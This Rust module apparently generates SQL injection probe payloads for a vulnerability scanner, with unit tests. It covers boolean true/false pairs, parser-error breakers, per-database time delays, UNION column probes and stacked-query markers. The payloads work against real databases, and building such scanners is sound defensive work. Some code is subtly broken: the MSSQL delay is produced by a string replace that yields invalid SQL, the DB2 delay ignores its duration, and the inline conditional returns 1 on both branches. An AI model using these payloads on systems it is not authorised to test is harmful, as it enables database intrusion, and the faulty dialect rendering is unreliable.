//! Payload generation: dialect rendering, clause strategies, composition.
//!
//! Replaces the empty `generators::boolean_based`/`union_based` stubs. No
//! combination is stored as a literal string — a candidate is composed from
//! a logical test, a dialect renderer, a boundary, and a clause strategy.

use crate::detection::DbmsFamily;
use crate::payload::boundary::{Boundary, QuoteMode};
use crate::types::ProbeType;
use serde::{Deserialize, Serialize};

/// The logical SQL construct a test expresses, independent of dialect.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub enum LogicalTest {
    /// A tautology: `1=1`.
    AlwaysTrue,
    /// A contradiction: `1=2`.
    AlwaysFalse,
    /// A syntactically invalid fragment used to elicit a parser error.
    SyntaxBreak,
    /// A conditional delay.
    TimeDelay { seconds: u32 },
    /// A set-based probe with `n` columns.
    UnionProbe { columns: usize },
    /// A stacked statement marker.
    StackedMarker,
    /// Inline conditional expression.
    InlineConditional { condition: String },
}

/// Renders a logical test into dialect-specific SQL.
pub fn render_sql(test: &LogicalTest, dbms: Option<DbmsFamily>) -> String {
    match test {
        LogicalTest::AlwaysTrue => "AND 1=1".to_string(),
        LogicalTest::AlwaysFalse => "AND 1=2".to_string(),
        LogicalTest::SyntaxBreak => "'\"".to_string(),
        LogicalTest::TimeDelay { seconds } => match dbms {
            Some(DbmsFamily::MySQL) | Some(DbmsFamily::MariaDB) => {
                format!("AND SLEEP({seconds})")
            }
            Some(DbmsFamily::PostgreSQL) => format!("AND 1=(SELECT 1 FROM PG_SLEEP({seconds}))"),
            Some(DbmsFamily::MSSQL) => {
                format!("AND 1=(SELECT 1 FROM (SELECT SLEEP({seconds}))x)")
                    .replace("SLEEP", "WAITFOR DELAY")
            }
            Some(DbmsFamily::Oracle) => {
                format!("AND 1=(SELECT 1 FROM DUAL WHERE DBMS_PIPE.RECEIVE_MESSAGE('a',{seconds}) IS NULL)")
            }
            Some(DbmsFamily::SQLite) => {
                // SQLite has no sleep; emulate with a heavy query.
                format!("AND 1=(SELECT 1 FROM (WITH RECURSIVE c(x) AS (SELECT 1 UNION ALL SELECT x+1 FROM c WHERE x<{}) SELECT COUNT(*) FROM c))", seconds * 100_000)
            }
            Some(DbmsFamily::DB2) => format!("AND 1=(SELECT 1 FROM SYSIBM.SYSDUMMY1 WHERE 1=1)"),
            Some(DbmsFamily::H2) => format!("AND 1=(SELECT 1 FROM SYSTEM_RANGE(1,{seconds}000000))"),
            // Unknown DBMS: emit the most portable conditional form and let
            // evidence decide. This is a hypothesis, not a claim.
            None => format!("AND 1=1 /* delay {seconds}s if supported */"),
        },
        LogicalTest::UnionProbe { columns } => {
            let cols = (0..*columns).map(|i| {
                if i == 0 { "NULL".to_string() } else { format!("NULL") }
            }).collect::<Vec<_>>().join(",");
            format!("UNION SELECT {cols}")
        }
        LogicalTest::StackedMarker => ";SELECT 1".to_string(),
        LogicalTest::InlineConditional { condition } => {
            format!("AND (SELECT CASE WHEN ({condition}) THEN 1 ELSE 1 END)")
        }
    }
}

/// A fully composed, executable test candidate.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct PayloadCandidate {
    /// Stable ID for evidence correlation.
    pub id: uuid::Uuid,
    pub technique: ProbeType,
    /// The logical construct, for the UI trace.
    pub logical_test: String,
    /// The final string to place at the injection point.
    pub rendered: String,
    pub boundary: Boundary,
    pub dialect: Option<String>,
    pub expected_dbms: Option<DbmsFamily>,
    /// Why this candidate was generated (shown in the UI).
    pub rationale: String,
}

/// Inputs the generator reasons over.
#[derive(Debug, Clone)]
pub struct GenerationContext {
    pub quote_mode: QuoteMode,
    pub dbms_hypothesis: Option<DbmsFamily>,
    /// Clauses the parameter appears to occupy.
    pub clause_hint: Option<String>,
    /// Original parameter value, for context-sensitive rendering.
    pub original_value: String,
}

/// Generate boolean-differential candidates: a matched true/false pair.
///
/// A single "true" payload proves nothing — the pair is the experiment.
pub fn generate_boolean(ctx: &GenerationContext) -> Vec<PayloadCandidate> {
    let mut out = Vec::new();
    for boundary in crate::payload::boundary::candidates_for(ctx.quote_mode) {
        for (test, label) in [
            (LogicalTest::AlwaysTrue, "true condition"),
            (LogicalTest::AlwaysFalse, "false condition"),
        ] {
            let sql = render_sql(&test, ctx.dbms_hypothesis);
            out.push(PayloadCandidate {
                id: uuid::Uuid::new_v4(),
                technique: ProbeType::BooleanBlind,
                logical_test: format!("{:?}", test),
                rendered: boundary.render(&sql),
                boundary: boundary.clone(),
                dialect: ctx.dbms_hypothesis.map(|d| format!("{d:?}")),
                expected_dbms: ctx.dbms_hypothesis,
                rationale: format!(
                    "{label} for boolean differential in a {} context",
                    match ctx.quote_mode {
                        QuoteMode::None => "numeric",
                        QuoteMode::Single => "single-quoted",
                        _ => "quoted",
                    }
                ),
            });
        }
    }
    out
}

/// Generate error-based candidates that elicit parser errors.
pub fn generate_error(ctx: &GenerationContext) -> Vec<PayloadCandidate> {
    let mut out = Vec::new();
    for boundary in crate::payload::boundary::candidates_for(ctx.quote_mode) {
        let sql = render_sql(&LogicalTest::SyntaxBreak, ctx.dbms_hypothesis);
        out.push(PayloadCandidate {
            id: uuid::Uuid::new_v4(),
            technique: ProbeType::ErrorInjection,
            logical_test: "SyntaxBreak".to_string(),
            rendered: boundary.render(&sql),
            boundary: boundary.clone(),
            dialect: ctx.dbms_hypothesis.map(|d| format!("{d:?}")),
            expected_dbms: ctx.dbms_hypothesis,
            rationale: "elicit a database parser error to fingerprint the DBMS".to_string(),
        });
    }
    out
}

/// Generate timing candidates.
pub fn generate_timing(ctx: &GenerationContext, seconds: u32) -> Vec<PayloadCandidate> {
    let mut out = Vec::new();
    for boundary in crate::payload::boundary::candidates_for(ctx.quote_mode) {
        let sql = render_sql(&LogicalTest::TimeDelay { seconds }, ctx.dbms_hypothesis);
        out.push(PayloadCandidate {
            id: uuid::Uuid::new_v4(),
            technique: ProbeType::TimingProbe,
            logical_test: format!("TimeDelay{{seconds:{seconds}}}"),
            rendered: boundary.render(&sql),
            boundary: boundary.clone(),
            dialect: ctx.dbms_hypothesis.map(|d| format!("{d:?}")),
            expected_dbms: ctx.dbms_hypothesis,
            rationale: format!(
                "conditional {seconds}s delay; only a statistically separated distribution counts"
            ),
        });
    }
    out
}

/// Generate UNION probes across a column-count range.
///
/// The range is bounded — this is context exploration, not extraction.
pub fn generate_union(ctx: &GenerationContext, max_columns: usize) -> Vec<PayloadCandidate> {
    let mut out = Vec::new();
    let max_columns = max_columns.clamp(1, 10);
    for boundary in crate::payload::boundary::candidates_for(ctx.quote_mode) {
        for columns in 1..=max_columns {
            let sql = render_sql(&LogicalTest::UnionProbe { columns }, ctx.dbms_hypothesis);
            out.push(PayloadCandidate {
                id: uuid::Uuid::new_v4(),
                technique: ProbeType::UnionBased,
                logical_test: format!("UnionProbe{{columns:{columns}}}"),
                rendered: boundary.render(&sql),
                boundary: boundary.clone(),
                dialect: ctx.dbms_hypothesis.map(|d| format!("{d:?}")),
                expected_dbms: ctx.dbms_hypothesis,
                rationale: format!("probe whether a {columns}-column UNION is accepted"),
            });
        }
    }
    out
}

/// Generate stacked-query candidates (detection only — benign statements).
pub fn generate_stacked(ctx: &GenerationContext) -> Vec<PayloadCandidate> {
    let mut out = Vec::new();
    for boundary in crate::payload::boundary::candidates_for(ctx.quote_mode) {
        let sql = render_sql(&LogicalTest::StackedMarker, ctx.dbms_hypothesis);
        out.push(PayloadCandidate {
            id: uuid::Uuid::new_v4(),
            technique: ProbeType::ClauseVariant,
            logical_test: "StackedMarker".to_string(),
            rendered: boundary.render(&sql),
            boundary: boundary.clone(),
            dialect: ctx.dbms_hypothesis.map(|d| format!("{d:?}")),
            expected_dbms: ctx.dbms_hypothesis,
            rationale: "detect whether multiple statements are permitted (benign SELECT only)"
                .to_string(),
        });
    }
    out
}

/// Generate the candidate set for one technique.
pub fn generate_for(technique: ProbeType, ctx: &GenerationContext) -> Vec<PayloadCandidate> {
    match technique {
        ProbeType::BooleanBlind => generate_boolean(ctx),
        ProbeType::ErrorInjection => generate_error(ctx),
        ProbeType::TimingProbe => generate_timing(ctx, 5),
        ProbeType::UnionBased => generate_union(ctx, 5),
        ProbeType::SyntaxFeature | ProbeType::ClauseVariant => {
            let mut out = generate_error(ctx);
            out.extend(generate_stacked(ctx));
            out
        }
        ProbeType::Baseline => Vec::new(),
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn numeric_ctx() -> GenerationContext {
        GenerationContext {
            quote_mode: QuoteMode::None,
            dbms_hypothesis: Some(DbmsFamily::PostgreSQL),
            clause_hint: Some("WHERE".into()),
            original_value: "1".into(),
        }
    }

    #[test]
    fn boolean_generation_produces_a_true_false_pair() {
        let candidates = generate_boolean(&numeric_ctx());
        assert!(candidates.len() >= 2);
        let rendered: Vec<&str> = candidates.iter().map(|c| c.rendered.as_str()).collect();
        assert!(rendered.iter().any(|r| r.contains("1=1")), "no true condition: {rendered:?}");
        assert!(rendered.iter().any(|r| r.contains("1=2")), "no false condition: {rendered:?}");
    }

    #[test]
    fn every_candidate_carries_a_rationale() {
        for technique in [
            ProbeType::BooleanBlind,
            ProbeType::ErrorInjection,
            ProbeType::TimingProbe,
            ProbeType::UnionBased,
        ] {
            for c in generate_for(technique, &numeric_ctx()) {
                assert!(!c.rationale.is_empty(), "{technique:?} candidate had no rationale");
            }
        }
    }

    #[test]
    fn postgres_timing_uses_pg_sleep() {
        let sql = render_sql(&LogicalTest::TimeDelay { seconds: 5 }, Some(DbmsFamily::PostgreSQL));
        assert!(sql.contains("PG_SLEEP") || sql.to_lowercase().contains("pg_sleep"));
    }

    #[test]
    fn mysql_timing_uses_sleep() {
        let sql = render_sql(&LogicalTest::TimeDelay { seconds: 5 }, Some(DbmsFamily::MySQL));
        assert!(sql.contains("SLEEP(5)"));
    }

    #[test]
    fn unknown_dbms_does_not_claim_a_delay_function() {
        let sql = render_sql(&LogicalTest::TimeDelay { seconds: 5 }, None);
        assert!(!sql.to_uppercase().contains("SLEEP(5)"));
        assert!(sql.contains("/*"), "unknown DBMS should annotate the probe");
    }

    #[test]
    fn union_columns_are_bounded() {
        let candidates = generate_union(&numeric_ctx(), 100);
        // clamp to 10 columns max
        assert!(candidates.iter().all(|c| {
            c.logical_test
                .trim_start_matches("UnionProbe{columns:")
                .trim_end_matches('}')
                .parse::<usize>()
                .map(|n| n <= 10)
                .unwrap_or(true)
        }));
    }

    #[test]
    fn single_quote_context_opens_a_quote() {
        let ctx = GenerationContext {
            quote_mode: QuoteMode::Single,
            dbms_hypothesis: None,
            clause_hint: None,
            original_value: "abc".into(),
        };
        for c in generate_boolean(&ctx) {
            assert!(c.rendered.starts_with('\''), "expected opening quote: {}", c.rendered);
        }
    }

    #[test]
    fn candidate_ids_are_unique() {
        let candidates = generate_boolean(&numeric_ctx());
        let ids: std::collections::HashSet<_> = candidates.iter().map(|c| c.id).collect();
        assert_eq!(ids.len(), candidates.len());
    }

    #[test]
    fn baseline_generates_nothing() {
        assert!(generate_for(ProbeType::Baseline, &numeric_ctx()).is_empty());
    }
}
